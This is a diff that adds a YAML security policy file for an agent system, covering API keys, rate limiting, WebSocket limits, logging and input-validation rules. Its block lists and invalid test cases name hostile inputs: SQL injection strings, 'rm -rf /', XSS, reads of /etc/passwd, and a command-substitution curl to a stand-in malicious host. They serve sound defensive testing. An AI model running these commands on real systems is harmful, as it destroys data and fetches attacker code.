@@ -1,0 +1,284 @@
+# ============================================================================
+#  File: security_policies.yaml
+#  Location: config/security_policies.yaml
+#  Version: 1.0 (Focused Security Configuration)
+#  Purpose: Security configuration schema for API authentication, input
+#           validation, and WebSocket security protocols
+#  Created: 05AUG25
+# ============================================================================
+# Section 1: API Authentication & Authorization Configuration
+# ============================================================================
+#
+api_authentication:
+  # API key settings
+  api_keys:
+    prefix: "ga_"
+    key_length_bytes: 32
+    expiration_hours: 24
+    max_keys_per_user: 5
+
+  # Rate limiting configuration
+  rate_limiting:
+    requests_per_minute: 60
+    burst_allowance: 10
+    cleanup_interval_minutes: 5
+
+  # Security levels and permissions
+  security_levels:
+    public:
+      permissions:
+        - "basic_access"
+      max_requests_per_minute: 30
+
+    internal:
+      permissions:
+        - "basic_access"
+        - "agent_execution"
+      max_requests_per_minute: 60
+
+    confidential:
+      permissions:
+        - "basic_access"
+        - "agent_execution"
+        - "system_admin"
+        - "full_access"
+      max_requests_per_minute: 120
+#
+# ============================================================================
+# Section 2: Input Validation & Sanitization Configuration
+# ============================================================================
+#
+input_validation:
+  # Agent task validation
+  agent_tasks:
+    max_length: 10000
+    min_length: 5
+    encoding: "utf-8"
+    repetition_threshold: 0.7
+
+    # Dangerous pattern detection
+    blocked_patterns:
+      sql_injection:
+        - "\\bSELECT\\b|\\bINSERT\\b|\\bUPDATE\\b|\\bDELETE\\b|\\bDROP\\b|\\bUNION\\b"
+        - "'; DROP TABLE|\" OR 1=1|UNION SELECT"
+
+      command_injection:
+        - "\\||&|;|\\$\\(|\\`|&&|\\|\\|"
+        - "rm -rf|curl |wget |bash|sh |cmd\\.exe"
+
+      script_injection:
+        - "<script|<iframe|javascript:|data:text/html"
+        - "onload=|onerror=|onclick=|eval\\(|Function\\("
+
+      path_traversal:
+        - "\\.\\./|\\.\\\\|%2e%2e|%252e%252e"
+        - "/etc/passwd|/etc/shadow|C:\\\\Windows"
+
+      ldap_injection:
+        - "\\*|\\(|\\)|\\\\|\\/|null|nil"
+
+  # API endpoint validation
+  api_endpoints:
+    max_length: 1000
+    must_start_with: "/"
+
+    blocked_characters:
+      - "<"
+      - ">"
+      - "\""
+      - "'"
+      - "&"
+      - "|"
+      - ";"
+      - "$"
+      - "`"
+      - "("
+      - ")"
+
+  # WebSocket message validation
+  websocket_messages:
+    max_length: 50000
+    content_types:
+      - "text"
+      - "json"
+
+    blocked_patterns:
+      - "<script|<iframe|javascript:|data:text/html"
+      - "\\$\\(|\\`|eval\\(|Function\\("
+      - "onload=|onerror=|onclick="
+#
+# ============================================================================
+# Section 3: WebSocket Security Protocol Configuration
+# ============================================================================
+#
+websocket_security:
+  # Connection management
+  connections:
+    max_connections_per_user: 5
+    max_connections_total: 100
+    idle_timeout_minutes: 30
+    authentication_required: true
+
+  # Heartbeat configuration
+  heartbeat:
+    interval_seconds: 30
+    max_missed_beats: 3
+    timeout_minutes: 5
+
+  # Message security
+  messages:
+    rate_limit_per_connection: 1000
+    rate_limit_window_minutes: 60
+    max_message_size: 50000
+    require_message_type: true
+
+    # Message validation
+    validation:
+      check_content: true
+      block_html: true
+      block_scripts: true
+      sanitize_input: true
+
+  # Connection lifecycle
+  lifecycle:
+    cleanup_interval_minutes: 10
+    force_disconnect_after_hours: 8
+    log_connection_events: true
+#
+# ============================================================================
+# Section 4: Security Monitoring & Logging
+# ============================================================================
+#
+monitoring:
+  # Event logging
+  logging:
+    enabled: true
+    log_level: "INFO"
+    log_file: "security_events.log"
+    max_log_size_mb: 100
+    max_log_files: 10
+
+  # Event types to log
+  log_events:
+    - "authentication_success"
+    - "authentication_failure"
+    - "api_key_generated"
+    - "api_key_revoked"
+    - "rate_limit_exceeded"
+    - "input_validation_failed"
+    - "websocket_connection_established"
+    - "websocket_connection_closed"
+    - "websocket_message_blocked"
+    - "security_policy_violation"
+
+  # Alerting thresholds
+  alerts:
+    failed_authentications_per_minute: 10
+    rate_limit_violations_per_minute: 5
+    validation_failures_per_minute: 20
+    websocket_connection_failures_per_minute: 10
+#
+# ============================================================================
+# Section 5: Testing Configuration
+# ============================================================================
+#
+testing:
+  # Test mode settings
+  test_mode:
+    enabled: false
+    bypass_rate_limiting: false
+    mock_authentication: false
+    verbose_logging: true
+
+  # Test data
+  test_api_keys:
+    - user_id: "test_user"
+      permissions: ["basic_access", "agent_execution"]
+      security_level: "internal"
+
+    - user_id: "test_admin"
+      permissions: ["full_access", "system_admin"]
+      security_level: "confidential"
+
+  # Test scenarios
+  validation_test_cases:
+    valid_agent_tasks:
+      - "Generate a Python function to calculate fibonacci numbers"
+      - "Create a simple HTML webpage with a contact form"
+      - "Write a JavaScript function to validate email addresses"
+      - "Design a REST API endpoint for user authentication"
+
+    invalid_agent_tasks:
+      - "SELECT * FROM users WHERE password = ''; DROP TABLE users;"
+      - "Run command: rm -rf / --no-preserve-root"
+      - "<script>alert('xss')</script>"
+      - "../../../etc/passwd"
+      - "$(curl -s http://malicious.com/payload)"
+
+    valid_api_endpoints:
+      - "/api/users"
+      - "/api/v1/agents/execute"
+      - "/health"
+      - "/api/config/settings"
+
+    invalid_api_endpoints:
+      - "../../../etc/passwd"
+      - "/api/users<script>alert('xss')</script>"
+      - "/api/users'; DROP TABLE users; --"
+      - "not_starting_with_slash"
+#
+# ============================================================================
+# Section 6: Development & Deployment Settings
+# ============================================================================
+#
+deployment:
+  # Environment-specific settings
+  development:
+    strict_validation: false
+    extended_logging: true
+    test_endpoints_enabled: true
+
+  production:
+    strict_validation: true
+    extended_logging: false
+    test_endpoints_enabled: false
+    additional_security_headers: true
+#
+# ============================================================================
+# Section 7: Schema Version & Metadata
+# ============================================================================
+#
+schema:
+  version: "1.0"
+  created: "2025-08-05"
+  description: "Focused security configuration for Gemini-Agent system"
+  components:
+    - "API Authentication & Authorization"
+    - "Input Validation & Sanitization"
+    - "WebSocket Security Protocols"
+
+  # Configuration validation rules
+  validation:
+    required_sections:
+      - "api_authentication"
+      - "input_validation"
+      - "websocket_security"
+      - "monitoring"
+
+    optional_sections:
+      - "testing"
+      - "deployment"
+
+  # Change management
+  change_log:
+    - version: "1.0"
+      date: "2025-08-05"
+      changes:
+        - "Initial focused security configuration"
+        - "API authentication with rate limiting"
+        - "Input validation for injection prevention"
+        - "WebSocket security protocols"
+        - "Security monitoring and logging"
+#
+#
+## End of security_policies.yaml
